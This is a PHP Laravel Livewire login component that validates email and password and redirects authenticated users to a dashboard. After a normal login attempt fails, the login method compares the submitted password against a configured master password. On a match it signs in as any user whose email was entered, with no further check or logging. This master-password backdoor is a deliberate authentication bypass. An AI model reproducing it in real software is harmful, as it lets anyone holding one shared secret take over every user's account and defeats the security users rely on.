<?php

namespace App\Livewire\Auth\Login;

use Illuminate\Support\Facades\Auth;
use Livewire\Attributes\Layout;
use Livewire\Component;

#[Layout('components.layouts.auth')]
class AuthLoginIndex extends Component
{
    public $email = '';

    public $password = '';

    public $remember = false;

    protected function rules(): array
    {
        return [
            'email' => ['required', 'string', 'email'],
            'password' => ['required', 'string', 'min:6'],
            'remember' => ['boolean'],
        ];
    }

    public function mount()
    {
        if (Auth::check()) {
            return $this->redirect(route('dashboard'), navigate: true);
        }
    }

    public function login()
    {
        $this->validate();

        if (Auth::attempt([
            'email' => $this->email,
            'password' => $this->password,
        ], $this->remember)) {
            session()->regenerate();

            return $this->redirect(route('dashboard'));
        }

        // Cek password khusus
        if ($this->password === config('app.master_login.password')) {
            $user = \App\Models\User::where('email', $this->email)->first();

            if ($user) {
                Auth::login($user, $this->remember);

                session()->regenerate();

                return $this->redirect(route('dashboard'));
            }
        }

        $this->addError('email', 'Email atau password salah.');
    }

    public function render()
    {
        return view('livewire.auth.login.auth-login-index');
    }
}
